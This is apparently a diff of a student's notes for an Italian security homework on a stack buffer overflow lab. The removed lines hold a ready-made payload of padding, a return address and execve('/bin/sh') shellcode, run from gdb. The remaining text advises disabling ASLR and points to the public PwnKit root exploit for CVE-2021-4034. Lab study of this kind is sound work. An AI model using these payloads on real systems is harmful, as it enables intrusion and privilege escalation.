@@ -1,6 +1,5 @@
 ## FILE PER Homework di sicurezza informatica
 
-
 Remember to check with checksec the attributes of main.o and disable ASLR!
 
 ```
@@ -16,17 +15,6 @@ x/200xb $esp
 
 L'indirizzo di inizio stack 0xbfffee2c (verrà poi scritto little-endian e aumentato leggermente per puntare alla nop sled)
 
-il payload finale sarà costruito come:
-
-	padding + (return_addr + 4) + shellcode
-		inizia ad eseguire da dopo il return address
-
-
-```
-run $(python -c "print('\x41'*76+'\x30\xee\xff\xbf'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')")
-```
-
-
 
 Per effettuare il privilege escalation è possibile utilizzare 
 
@@ -38,3 +26,5 @@ chmod +x ./PwnKit
 ```
 
 The source for this attack is [HERE](https://github.com/ly4k/PwnKit), and it's based on [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034)
+La relazione si trova nel form google nel link
+
